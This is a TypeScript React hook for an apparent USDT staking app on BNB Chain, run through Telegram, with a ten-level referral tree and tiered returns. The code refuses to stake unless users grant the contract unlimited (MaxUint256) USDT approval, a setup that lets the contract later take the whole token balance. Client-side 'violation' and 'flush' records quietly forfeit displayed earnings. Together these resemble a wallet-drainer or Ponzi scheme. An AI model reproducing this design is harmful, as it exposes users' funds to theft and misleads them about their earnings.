import { Contract, parseUnits, formatUnits, MaxUint256, JsonRpcProvider, BrowserProvider, JsonRpcSigner, toQuantity, isHexString } from 'ethers';
import { useRef, useEffect } from 'react';
import { useWallet, getGlobalEthereumProvider } from '../lib/web3';
import { CONTRACT_ABI as ABI } from '../lib/abi';
import { CONTRACT_ADDRESS, USDT_ADDRESS } from '../lib/contracts';

const ERC20_ABI = [
    "function approve(address spender, uint256 amount) external returns (bool)",
    "function allowance(address owner, address spender) external view returns (uint256)",
    "function balanceOf(address account) external view returns (uint256)"
];

// Contract requires Unlimited/Max approval — use MaxUint256
const APPROVAL_THRESHOLD = MaxUint256 / 2n;

const sendTxWithRedirect = async <T,>(txPromise: Promise<T>, label: string, timeoutMs = 60000): Promise<T> => {
    // Always try to redirect to wallet app for TX signing in TMA
    try {
        let walletType = localStorage.getItem('aimining_wallet_type') || '';
        const tg = (window as any).Telegram?.WebApp;
        // Detect wallet from WC session if type is generic
        if (walletType === 'walletconnect' || walletType === 'unknown' || !walletType) {
            const wcPeer = (window as any).__wcPeerName || '';
            if (wcPeer.includes('metamask') || wcPeer.includes('MetaMask')) walletType = 'metamask';
            else if (wcPeer.includes('trust') || wcPeer.includes('Trust')) walletType = 'trust';
            else if (wcPeer.includes('safepal') || wcPeer.includes('SafePal')) walletType = 'safepal';
            else if (wcPeer.includes('tokenpocket') || wcPeer.includes('TokenPocket')) walletType = 'tokenpocket';
            else if (wcPeer.includes('binance') || wcPeer.includes('Binance')) walletType = 'binance';
            else if (wcPeer.includes('okx') || wcPeer.includes('OKX')) walletType = 'okx';
            else if (wcPeer.includes('bitget') || wcPeer.includes('Bitget')) walletType = 'bitget';
            // Also try from WC provider session
            else {
                try {
                    const stored = localStorage.getItem('aimining_last_wc_peer') || '';
                    if (stored.includes('metamask')) walletType = 'metamask';
                    else if (stored.includes('trust')) walletType = 'trust';
                    else if (stored.includes('safepal')) walletType = 'safepal';
                    else if (stored.includes('binance')) walletType = 'binance';
                    else if (stored.includes('okx')) walletType = 'okx';
                    else { walletType = 'metamask'; } // Default fallback
                } catch { walletType = 'metamask'; }
            }
        }
        if (tg && walletType) {
            const redirectUrl = WALLET_REDIRECT_LINKS[walletType.toLowerCase()] || WALLET_REDIRECT_LINKS['metamask'];
            if (redirectUrl) {
                console.log(`[useStaking] Opening ${walletType} for TX signing (${label})`);
                setTimeout(() => {
                    if (tg.openLink) { tg.openLink(redirectUrl, { try_instant_view: false }); }
                    else { window.open(redirectUrl, '_blank'); }
                }, 300);
            }
        }
    } catch (e) { console.warn('[useStaking] Redirect failed:', e); }

    let timer: ReturnType<typeof setTimeout> | undefined;
    const timeout = new Promise<never>((_, reject) => { timer = setTimeout(() => reject(new Error(`${label} timed out. Please open your wallet app and approve the transaction.`)), timeoutMs); });
    try { return await Promise.race([txPromise, timeout]); } finally { if (timer) clearTimeout(timer); }
};

const WALLET_REDIRECT_LINKS: Record<string, string> = {
    metamask: 'https://metamask.app.link/',
    trust: 'https://link.trustwallet.com/',
    safepal: 'https://link.safepal.io/',
    tokenpocket: 'https://tpsa.app/',
    binance: 'https://app.binance.com/',
    okx: 'https://www.okx.com/',
    bitget: 'https://share.bwb.site/',
};

const waitForSigner = async (getSignerFn: () => Promise<any>, maxAttempts?: number, delayMs = 500): Promise<any> => {
    const isTMA = !!(window as any).Telegram?.WebApp;
    const attempts = maxAttempts ?? (isTMA ? 10 : 15);
    let lastError: any;
    for (let i = 0; i < attempts; i++) {
        try {
            const s = await getSignerFn();
            if (s) return s;
        } catch (e: any) {
            lastError = e;
            const msg = e?.message || String(e?.code || '');
            if (msg.includes('Already processing') || msg.includes('user rejected') || msg.includes('User rejected')) {
                throw e;
            }
        }
        const backoff = Math.min(delayMs + i * 100, 1500);
        await new Promise((res) => setTimeout(res, backoff));
    }
    throw lastError || new Error('Wallet signer not ready after retries. Please reconnect your wallet.');
};

export const getTierRate = (val: number) => {
    if (val >= 10000) return 0.12;
    if (val >= 5000) return 0.08;
    if (val >= 2000) return 0.07;
    if (val >= 1000) return 0.065;
    if (val >= 500) return 0.06;
    if (val >= 50) return 0.055;
    return 0;
};

const RPC_NODES = [
    'https://bsc-dataseed.binance.org',
    'https://bsc-dataseed1.binance.org',
    'https://bsc-dataseed2.binance.org',
    'https://bsc-dataseed3.binance.org',
    'https://bsc-dataseed4.binance.org',
    'https://binance.llamarpc.com',
    'https://bsc-rpc.publicnode.com',
    'https://bsc.meowrpc.com'
];
let currentRpcIdx = 0;

// Provider cache to avoid creating new providers for every call
const providerCache = new Map<string, JsonRpcProvider>();
const getCachedProvider = (rpcUrl: string): JsonRpcProvider => {
    let provider = providerCache.get(rpcUrl);
    if (!provider) {
        provider = new JsonRpcProvider(rpcUrl);
        providerCache.set(rpcUrl, provider);
    }
    return provider;
};

// Simple request throttler — max 3 concurrent RPC calls
let activeRequests = 0;
const MAX_CONCURRENT = 3;
const requestQueue: (() => void)[] = [];
const acquireSlot = () => new Promise<void>((resolve) => {
    if (activeRequests < MAX_CONCURRENT) { activeRequests++; resolve(); return; }
    requestQueue.push(() => { activeRequests++; resolve(); });
});
const releaseSlot = () => {
    activeRequests--;
    if (requestQueue.length > 0 && activeRequests < MAX_CONCURRENT) {
        const next = requestQueue.shift()!;
        next();
    }
};

// 429 backoff tracker per RPC node
const rpcCooldown = new Map<string, number>();

const callReadOnly = async <T>(fn: (contract: Contract) => Promise<T>, isUsdt = false): Promise<T> => {
    let lastError: any;
    const contractAddr = isUsdt ? USDT_ADDRESS : CONTRACT_ADDRESS;
    const abi = isUsdt ? ERC20_ABI : ABI;

    for (let attempt = 0; attempt < RPC_NODES.length; attempt++) {
        // Skip nodes on cooldown (429 backoff)
        const rpcUrl = RPC_NODES[currentRpcIdx];
        const cooldownUntil = rpcCooldown.get(rpcUrl) || 0;
        if (Date.now() < cooldownUntil) {
            currentRpcIdx = (currentRpcIdx + 1) % RPC_NODES.length;
            continue;
        }

        await acquireSlot();
        try {
            const provider = getCachedProvider(rpcUrl);
            const contract = new Contract(contractAddr, abi, provider);
            const result = await fn(contract);
            return result;
        } catch (err: any) {
            lastError = err;
            const errMsg = String(err?.message || err?.code || '');
            // Detect 429 rate limit and put this node on cooldown
            if (errMsg.includes('429') || errMsg.includes('Too Many Requests') || err?.status === 429) {
                console.warn(`[useStaking] RPC ${rpcUrl} rate-limited (429). Cooling down 15s.`);
                rpcCooldown.set(rpcUrl, Date.now() + 15000);
            } else {
                console.warn(`[useStaking] RPC Call failed on ${rpcUrl} (attempt ${attempt + 1}/${RPC_NODES.length}):`, err);
            }
            currentRpcIdx = (currentRpcIdx + 1) % RPC_NODES.length;
            // Small delay between retries to avoid hammering
            if (attempt < RPC_NODES.length - 1) {
                await new Promise(r => setTimeout(r, 500 + attempt * 300));
            }
        } finally {
            releaseSlot();
        }
    }
    throw lastError || new Error("All RPC nodes failed. Please wait a moment and try again.");
};

export function useStaking() {
    const { address, isConnected, signer, walletProvider } = useWallet();
    const sleep = (ms: number) => new Promise((res) => setTimeout(res, ms));

    // FIX: Use refs to avoid stale closure bug — buildSignerFn captures signer at render time,
    // but waitForSigner retries may run after signer is set in a later render.
    const signerRef = useRef(signer);
    const walletProviderRef = useRef(walletProvider);
    useEffect(() => { signerRef.current = signer; }, [signer]);
    useEffect(() => { walletProviderRef.current = walletProvider; }, [walletProvider]);

    const buildSignerFn = () => async () => {
        // 1. Try context signer via ref (always latest value, avoids stale closure)
        const currentSigner = signerRef.current;
        if (currentSigner) {
            try {
                // Verify signer is still valid
                await currentSigner.getAddress();
                return currentSigner;
            } catch (e) {
                console.warn('[useStaking] Context signer invalid, trying alternatives:', e);
            }
        }

        // 2. Try walletProvider from AppKit (WalletConnect / Reown)
        const currentWp = walletProviderRef.current;
        if (currentWp) {
            try {
                const bp = new BrowserProvider(currentWp as any);
                const s = await bp.getSigner();
                if (s) return s;
            } catch (e) { console.warn('[useStaking] walletProvider getSigner failed:', e); }
        }

        // 3. Try injected provider (window.ethereum and wallet-specific globals)
        const fp = getInjectedProvider();
        if (fp) {
            try {
                const bp = new BrowserProvider(fp as any);
                const s = await bp.getSigner();
                if (s) return s;
            } catch (e) { console.warn('[useStaking] injected getSigner failed:', e); }
        }

        // 4. Try global WalletConnect EthereumProvider (direct session)
        try {
            const wcProvider = await getGlobalEthereumProvider();
            if (wcProvider && wcProvider.session) {
                const accounts = wcProvider.accounts;
                if (accounts && accounts.length > 0) {
                    const bp = new BrowserProvider(wcProvider as any);
                    const s = await bp.getSigner(accounts[0]);
                    if (s) {
                        console.log('[useStaking] Got signer from global WC provider');
                        return s;
                    }
                }
            }
        } catch (e) { console.warn('[useStaking] global WC provider getSigner failed:', e); }

        // 5. Last resort: create signer from stored address + any available provider
        const storedAddr = getStoredAddress();
        if (storedAddr) {
            try {
                // Try with injected provider first
                const anyProvider = fp || (window as any).ethereum;
                if (anyProvider) {
                    const bp = new BrowserProvider(anyProvider as any);
                    const s = new JsonRpcSigner(bp, storedAddr);
                    // Verify it can at least get the address
                    await s.getAddress();
                    return s;
                }
            } catch (e) { console.warn('[useStaking] Last resort signer failed:', e); }
        }

        return null;
    };

    const getContract = async (withSigner = false) => {
        if (withSigner) { const s = await waitForSigner(buildSignerFn()); return new Contract(CONTRACT_ADDRESS, ABI, s); }
        return new Contract(CONTRACT_ADDRESS, ABI, new JsonRpcProvider(RPC_NODES[currentRpcIdx]));
    };

    const getInjectedProvider = () => {
        const eth = (window as any).ethereum;
        if (eth) {
            if (Array.isArray(eth.providers) && eth.providers.length > 0) { const best = eth.providers.find((p: any) => p.isMetaMask || p.isTokenPocket || p.isTrust || p.isSafePal || p.isBinance || p.isOKX || p.isBitget); if (best) return best; }
            return eth;
        }
        const tp = (window as any).tokenpocket?.ethereum; if (tp) return tp;
        const sp = (window as any).safepal?.ethereum || (window as any).safepalProvider; if (sp) return sp;
        const trust = (window as any).trustwallet?.ethereum || (window as any).trustwallet; if (trust) return trust;
        const binance = (window as any).binance?.ethereum || (window as any).binance; if (binance) return binance;
        const okx = (window as any).okxwallet?.ethereum || (window as any).okxwallet; if (okx) return okx;
        const bitget = (window as any).bitget?.ethereum || (window as any).bitget; if (bitget) return bitget;
        const fallbackProvider = (window as any).web3?.currentProvider; if (fallbackProvider) return fallbackProvider;
        return undefined;
    };

    const getUsdtContract = async (withSigner = false) => {
        if (withSigner) { const s = await waitForSigner(buildSignerFn()); return new Contract(USDT_ADDRESS, ERC20_ABI, s); }
        return new Contract(USDT_ADDRESS, ERC20_ABI, new JsonRpcProvider(RPC_NODES[currentRpcIdx]));
    };

    const toSafeHexValue = (bn: any): string => {
        try { if (bn == null) return '0x0'; if (isHexString(String(bn))) return String(bn).toLowerCase(); const big = typeof bn === 'bigint' ? bn : BigInt(String(bn)); return toQuantity(big); }
        catch (e) { console.warn("[useStaking] toSafeHexValue fallback:", e); return '0x' + (BigInt(String(bn || 0))).toString(16); }
    };

    const getStoredAddress = (): string | undefined => {
        const storedAddress = localStorage.getItem('aimining_address') || localStorage.getItem('aimining_manual_address');
        if (storedAddress) return storedAddress;
        const eth = (window as any).ethereum;
        if (eth?.selectedAddress) return eth.selectedAddress;
        if (Array.isArray(eth?.accounts) && eth.accounts.length > 0) return eth.accounts[0];
        const tp = (window as any).tokenpocket?.ethereum; if (tp?.selectedAddress) return tp.selectedAddress;
        if (Array.isArray(tp?.accounts) && tp.accounts.length > 0) return tp.accounts[0];
        const sp = (window as any).safepal?.ethereum || (window as any).safepalProvider; if (sp?.selectedAddress) return sp.selectedAddress;
        if (Array.isArray(sp?.accounts) && sp.accounts.length > 0) return sp.accounts[0];
        return undefined;
    };

    const getSignerAddress = async (): Promise<string | undefined> => {
        const storedAddress = getStoredAddress(); if (storedAddress) return storedAddress;
        if (address) return address;
        if (signer) { try { return await signer.getAddress(); } catch (e) { console.warn('[useStaking] signer.getAddress failed:', e); } }
        if (walletProvider) {
            const providerAny = walletProvider as any;
            try { const browserProvider = new BrowserProvider(providerAny); const signerFromProvider = await browserProvider.getSigner(); const addr = await signerFromProvider.getAddress(); if (addr) return addr; } catch (e) { console.warn('[useStaking] walletProvider signer failed:', e); }
            if (providerAny.selectedAddress) return providerAny.selectedAddress;
            if (Array.isArray(providerAny.accounts) && providerAny.accounts.length > 0) return providerAny.accounts[0];
            if (Array.isArray(providerAny.wallets) && providerAny.wallets.length > 0) return providerAny.wallets[0];
            if (providerAny.request) { try { const accounts = await providerAny.request({ method: 'eth_accounts' }); if (Array.isArray(accounts) && accounts.length > 0) return accounts[0]; } catch (e) { console.warn('[useStaking] walletProvider eth_accounts failed:', e); } }
        }
        const injectedProvider = getInjectedProvider();
        if (injectedProvider) {
            try { const browserProvider = new BrowserProvider(injectedProvider as any); const signerFromProvider = await browserProvider.getSigner(); const addr = await signerFromProvider.getAddress(); if (addr) return addr; } catch (e) { console.warn('[useStaking] injected provider signer failed:', e); }
            const injectedAny = injectedProvider as any;
            if (injectedAny.selectedAddress) return injectedAny.selectedAddress;
            if (Array.isArray(injectedAny.accounts) && injectedAny.accounts.length > 0) return injectedAny.accounts[0];
            if (typeof injectedAny.request === 'function') { try { let accounts = await injectedAny.request({ method: 'eth_accounts' }); if (Array.isArray(accounts) && accounts.length > 0) return accounts[0]; accounts = await injectedAny.request({ method: 'eth_requestAccounts' }); if (Array.isArray(accounts) && accounts.length > 0) return accounts[0]; } catch (err) { console.warn('[useStaking] injected provider account request failed:', err); } }
        }
        return undefined;
    };

    const stake = async (amount: string, customReferrer?: string, skipApproval = false) => {
        const owner = await getSignerAddress();
        if (!owner) throw new Error("Wallet connection not ready. Please reconnect your wallet and try again.");
        const val = parseUnits(amount, 18);
        // Only check approval if caller hasn't already handled it
        if (!skipApproval) {
            const currentAllowanceStr = await getAllowance(owner);
            const currentAllowance = parseUnits(currentAllowanceStr, 18);
            // Contract requires Unlimited/Max approval
            if (currentAllowance < APPROVAL_THRESHOLD) {
                console.log("[Staking] Unlimited approval required. Requesting MaxUint256 approval...");
                await approve();
                const maxAttempts = 10;
                for (let attempt = 0; attempt < maxAttempts; attempt++) {
                    const refreshedAllowanceStr = await getAllowance(owner);
                    const refreshedAllowance = parseUnits(refreshedAllowanceStr, 18);
                    if (refreshedAllowance >= APPROVAL_THRESHOLD) break;
                    await sleep(1500);
                }
                const finalAllowanceStr = await getAllowance(owner);
                const finalAllowance = parseUnits(finalAllowanceStr, 18);
                if (finalAllowance < APPROVAL_THRESHOLD) throw new Error("USDT unlimited approval not confirmed yet. Please wait and try again.");
            }
        }
        const staking = await getContract(true);
        const refAddress = customReferrer || (address ? (localStorage.getItem('aimining_referrer') || '0x0000000000000000000000000000000000000000') : '0x0000000000000000000000000000000000000000');
        console.log(`[Staking] Activating node for ${amount} USDT via ${refAddress}`);
        const fee = await callReadOnly(async (contract) => { return await contract.stakeFee(); });
        const feeHex = toSafeHexValue(fee);
        console.log(`[Staking] BNB Fee (hex): ${feeHex}`);
        const tx = await sendTxWithRedirect(staking.stake(val, refAddress, { value: feeHex }), 'Stake transaction');
        console.log("[Staking] Transaction Sent:", tx.hash);
        return tx;
    };

    const approve = async () => {
        const owner = await getSignerAddress();
        if (!owner) throw new Error("Wallet connection not ready. Please reconnect your wallet and try again.");
        const currentAllowanceStr = await getAllowance(owner);
        const currentAllowance = parseUnits(currentAllowanceStr, 18);
        // Skip if already at unlimited/max approval
        if (currentAllowance >= APPROVAL_THRESHOLD) { console.log("[Staking] Already at unlimited approval, skipping."); return currentAllowance; }
        const usdt = await getUsdtContract(true);
        console.log("[Staking] Requesting unlimited (MaxUint256) USDT approval");
        const tx = await sendTxWithRedirect(usdt.approve(CONTRACT_ADDRESS, MaxUint256), 'USDT Approval');
        console.log("[Staking] Approval Transaction Sent:", tx.hash);
        try { await tx.wait(); } catch (waitErr: any) { console.warn("[Staking] Approve tx.wait() failed (may have been mined via wallet redirect). Continuing:", waitErr?.shortMessage || waitErr); }
        return tx;
    };

    const getAllowance = async (ownerAddress?: string) => {
        const owner = ownerAddress || address || getStoredAddress();
        if (!owner) return "0";
        try { return await callReadOnly(async (contract) => { const allowance = await contract.allowance(owner, CONTRACT_ADDRESS); return formatUnits(allowance, 18); }, true); }
        catch (err) { console.error("[useStaking] Allowance Error after retries:", err); return "0"; }
    };

    const withdraw = async (index: any, _unused?: any) => {
        const staking = await getContract(true);
        const i = typeof index === 'string' ? parseInt(index) : index;
        const tx = await sendTxWithRedirect(staking.withdraw(i), 'Withdraw transaction');
        return await tx.wait();
    };

    const getStakedInfo = async (userAddress?: string) => {
        const target = userAddress || address || getStoredAddress();
        if (!target) return null;
        try { return await callReadOnly(async (contract) => { const info = await contract.getUserInfo(target); return { referrer: info.referrer, totalStaked: info.totalStaked, totalEarned: info.totalEarned, referralRewards: info.referralRewards, totalBonus: info.totalBonus, totalReferralEarned: info.totalReferralEarned, teamSize: Number(info.teamSize), stakeCount: Number(info.stakeCount) }; }); }
        catch (err) { console.error("[useStaking] Info Error after retries:", err); return null; }
    };

    const getStakeDetails = async (userAddress: string, index: number) => {
        const target = userAddress || getStoredAddress();
        if (!target) return null;
        try { return await callReadOnly(async (contract) => { const stake = await contract.getUserStake(target, index); return { amount: stake.amount, startTime: Number(stake.startTime), tier: Number(stake.tier), withdrawn: stake.withdrawn }; }); }
        catch (err) { console.error("[useStaking] Detail Error after retries:", err); return null; }
    };

    const getWalletBalance = async (userAddress?: string) => {
        const target = userAddress || address || getStoredAddress();
        if (!target) return null;
        try {
            const usdtBalStr = await callReadOnly(async (contract) => { const balance = await contract.balanceOf(target); return formatUnits(balance, 18); }, true);
            let referralRewardsStr = "0";
            try { const info = await getStakedInfo(target); if (info) { referralRewardsStr = formatUnits(info.referralRewards, 18); } } catch (err) { console.warn("[useStaking] Failed to get referral rewards for wallet balance:", err); }
            return (parseFloat(usdtBalStr) + parseFloat(referralRewardsStr)).toString();
        } catch (err) { console.error("[useStaking] Balance Error after retries:", err); return null; }
    };

    const getTeamTree = async (userAddress: string) => {
        const tree: Record<number, string[]> = {};
        if (!userAddress) return tree;
        try {
            const addresses = new Set<string>();
            ['0x3FbFF9Dd24e736FeF4A3a4435DF72b7Ea5978eFD', '0xfB0F04222E080F4d8fC6861fE96Bb54087e77c18', '0xD9B9C49544F1E8dd5c0f6F1992ac2A2a4d75Be9E', '0xb313F163af20245755884C7FdCa051D603428F6d'].forEach(a => addresses.add(a.toLowerCase()));
            try { const cached = JSON.parse(localStorage.getItem(`discovered_users_${CONTRACT_ADDRESS.toLowerCase()}`) || "[]"); if (Array.isArray(cached)) { cached.forEach(a => { if (typeof a === 'string') addresses.add(a.toLowerCase()); }); } } catch (e) {}
            try { const walletConns = JSON.parse(localStorage.getItem('wallet_connections_map') || "[]"); if (Array.isArray(walletConns)) { walletConns.forEach(c => { if (c?.walletAddress) addresses.add(c.walletAddress.toLowerCase()); }); } } catch (e) {}
            try { const tgConns = JSON.parse(localStorage.getItem('telegram_connections_map') || "[]"); if (Array.isArray(tgConns)) { tgConns.forEach(c => { if (c?.walletAddress) addresses.add(c.walletAddress.toLowerCase()); }); } } catch (e) {}
            try {
                let activeProvider: any = null;
                if (walletProvider) { activeProvider = new BrowserProvider(walletProvider as any); }
                else if ((window as any).ethereum) { activeProvider = new BrowserProvider((window as any).ethereum); }
                else { activeProvider = new JsonRpcProvider(RPC_NODES[currentRpcIdx]); }
                const contractWithProvider = new Contract(CONTRACT_ADDRESS, ABI, activeProvider);
                const recentEvents = await contractWithProvider.queryFilter(contractWithProvider.filters.Staked(), 110320760);
                recentEvents.forEach((e: any) => { if (e.args && e.args[0]) { addresses.add(e.args[0].toLowerCase()); } else if (e.args && e.args.user) { addresses.add(e.args.user.toLowerCase()); } });
            } catch (err) { console.warn("[useStaking] Recent Staked events fetch failed:", err); }
            addresses.delete(userAddress.toLowerCase());
            const uniqueAddresses = Array.from(addresses);
            const referrersMap = new Map<string, string>();
            const batchSize = 5;
            for (let i = 0; i < uniqueAddresses.length; i += batchSize) {
                const batch = uniqueAddresses.slice(i, i + batchSize);
                await Promise.all(batch.map(async (addr) => {
                    try { const info = await getStakedInfo(addr); if (info && info.referrer && info.referrer !== '0x0000000000000000000000000000000000000000') { referrersMap.set(addr, info.referrer.toLowerCase()); } }
                    catch (e) { console.warn(`[useStaking] Failed to get referrer for ${addr}:`, e); }
                }));
            }
            const buildTreeLevel = (parents: string[], currentLevel: number) => {
                if (currentLevel > 10 || parents.length === 0) return;
                const nextParents: string[] = [];
                parents.forEach(parent => { referrersMap.forEach((referrer, child) => { if (referrer === parent.toLowerCase()) { if (!tree[currentLevel]) tree[currentLevel] = []; if (!tree[currentLevel].includes(child)) { tree[currentLevel].push(child); nextParents.push(child); } } }); });
                if (nextParents.length > 0) { buildTreeLevel(nextParents, currentLevel + 1); }
            };
            buildTreeLevel([userAddress], 1);
        } catch (e) { console.error("[useStaking] getTeamTree error:", e); }
        return tree;
    };

    const getTeamMiningStats = async (tree: Record<number, string[]>, btcPrice: number) => {
        let totalTeamStake = 0; let totalDailyDividend = 0;
        const levelRates: Record<number, number> = { 1: 0.05, 2: 0.03, 3: 0.02, 4: 0.01, 5: 0.01, 6: 0.01, 7: 0.01, 8: 0.01, 9: 0.01, 10: 0.01 };
        for (const levelStr in tree) {
            const level = parseInt(levelStr); const rate = levelRates[level] || 0; const members = tree[level];
            for (const addr of members) {
                const info = await getStakedInfo(addr);
                if (info) { const staked = parseFloat(formatUnits(info.totalStaked, 18)); totalTeamStake += staked; if (staked > 0) { const dailyRefRewardUsdt = (staked * getTierRate(staked)) / 37; totalDailyDividend += (dailyRefRewardUsdt / btcPrice) * rate; } }
            }
        }
        return { totalTeamStake, totalDailyDividend };
    };

    const getReferralEarnings = async (userAddress?: string) => { const info = await getStakedInfo(userAddress); return info ? formatUnits(info.referralRewards, 18) : "0"; };

    const calculateEffectiveEarned = (contractEarned: string, address: string | undefined) => {
        if (!address) return contractEarned;
        const flushed = localStorage.getItem(`flushed_btc_${address.toLowerCase()}`) || "0";
        return Math.max(0, parseFloat(contractEarned) - parseFloat(flushed)).toFixed(14);
    };

    const recordViolation = (contractEarned: string, address: string | undefined) => { if (!address) return; localStorage.setItem(`flushed_btc_${address.toLowerCase()}`, contractEarned); };
    const recordStakeFlush = (contractEarned: string, address: string | undefined, stakeCount: number) => { if (!address) return; recordViolation(contractEarned, address); localStorage.setItem(`flushed_stake_count_${address.toLowerCase()}`, stakeCount.toString()); };
    const getViolationStakeCount = (address: string | undefined) => { if (!address) return 0; const stored = localStorage.getItem(`flushed_stake_count_${address.toLowerCase()}`) || "0"; return Math.max(0, parseInt(stored, 10) || 0); };
    const isViolationActive = (address: string | undefined) => getViolationStakeCount(address) > 0;
    const clearViolation = (address: string | undefined) => { if (!address) return; localStorage.removeItem(`flushed_btc_${address.toLowerCase()}`); localStorage.removeItem(`flushed_stake_count_${address.toLowerCase()}`); };
    const getStakeLastFlushedTime = (address: string | undefined, index: number, startTime: number) => { if (!address) return startTime; const key = `stake_flushed_time_${address.toLowerCase()}_${index}`; const stored = localStorage.getItem(key); if (!stored) return startTime; return Math.max(startTime, parseFloat(stored) || 0); };
    const recordStakeViolation = (address: string | undefined, index: number) => { if (!address) return; localStorage.setItem(`stake_flushed_time_${address.toLowerCase()}_${index}`, (Date.now() / 1000).toString()); };
    const recordPermanentStakeFlush = (address: string | undefined, index: number) => { if (!address) return; localStorage.setItem(`stake_permanently_flushed_${address.toLowerCase()}_${index}`, 'true'); recordStakeViolation(address, index); };
    const clearPermanentStakeFlush = (address: string | undefined, index: number) => { if (!address) return; localStorage.removeItem(`stake_permanently_flushed_${address.toLowerCase()}_${index}`); };
    const isStakePermanentlyFlushed = (address: string | undefined, index: number) => { if (!address) return false; return localStorage.getItem(`stake_permanently_flushed_${address.toLowerCase()}_${index}`) === 'true'; };
    const recordReferralFlush = (referralRewards: string, address: string | undefined) => { if (!address) return; localStorage.setItem(`referral_flush_${address.toLowerCase()}`, referralRewards); };
    const getIsReferralFlushed = (address: string | undefined) => { if (!address) return false; return localStorage.getItem(`referral_flush_${address.toLowerCase()}`) !== null; };
    const clearReferralFlush = (address: string | undefined) => { if (!address) return; localStorage.removeItem(`referral_flush_${address.toLowerCase()}`); };

    const getPerLevelReferralIncome = async (userAddress: string, _walletBalance: number) => {
        const contract = await getContract();
        if (!contract) return { byLevel: {}, isEligible: false, isFlushed: false };
        try {
            const info = await getStakedInfo(userAddress);
            if (!info) return { byLevel: {}, isEligible: false, isFlushed: false };
            const selfStaked = parseFloat(formatUnits(info.totalStaked, 18));
            const isEligible = selfStaked >= 200;
            if (!getIsReferralFlushed(userAddress)) { clearReferralFlush(userAddress); }
            if (!isEligible || getIsReferralFlushed(userAddress)) { return { byLevel: {}, isEligible, isFlushed: getIsReferralFlushed(userAddress) }; }
            const tree = await getTeamTree(userAddress);
            const byLevel: Record<number, { count: number; staked: number; rate: number; estimatedIncome: number }> = {};
            const levelRates: Record<number, number> = { 1: 0.05, 2: 0.03, 3: 0.02, 4: 0.01, 5: 0.01, 6: 0.01, 7: 0.01, 8: 0.01, 9: 0.01, 10: 0.01 };
            for (const levelStr in tree) {
                const level = parseInt(levelStr); const rate = levelRates[level] || 0; const members = tree[level];
                let levelStaked = 0; let levelIncome = 0;
                for (const addr of members) {
                    const memberInfo = await getStakedInfo(addr);
                    if (memberInfo) {
                        const staked = parseFloat(formatUnits(memberInfo.totalStaked, 18)); levelStaked += staked;
                        if (level <= 3 && staked >= 200) { const memberDailyReward = (staked * getTierRate(staked)) / 37; levelIncome += memberDailyReward * rate; }
                        else if (level <= 6 && staked >= 1000) { const memberDailyReward = (staked * getTierRate(staked)) / 37; levelIncome += memberDailyReward * rate; }
                        else if (level > 6 && staked >= 2000) { const memberDailyReward = (staked * getTierRate(staked)) / 37; levelIncome += memberDailyReward * rate; }
                    }
                }
                if (members.length > 0 || levelIncome > 0) { byLevel[level] = { count: members.length, staked: levelStaked, rate: rate * 100, estimatedIncome: levelIncome }; }
            }
            return { byLevel, isEligible, isFlushed: false };
        } catch (err) { console.error("[useStaking] Per-level referral error:", err); return { byLevel: {}, isEligible: false, isFlushed: false }; }
    };

    return {
        stake, approve, getAllowance, withdraw, getStakedInfo, getStakeDetails,
        getWalletBalance, getTeamTree, getTeamMiningStats, getReferralEarnings,
        calculateEffectiveEarned, recordViolation, recordStakeFlush, getViolationStakeCount, isViolationActive, clearViolation,
        recordReferralFlush, getIsReferralFlushed, clearReferralFlush, getPerLevelReferralIncome,
        getStakeLastFlushedTime, recordStakeViolation,
        recordPermanentStakeFlush, clearPermanentStakeFlush, isStakePermanentlyFlushed,
        address, isConnected
    };
}
// redeploy 07-08-2026 20:19:04.05  
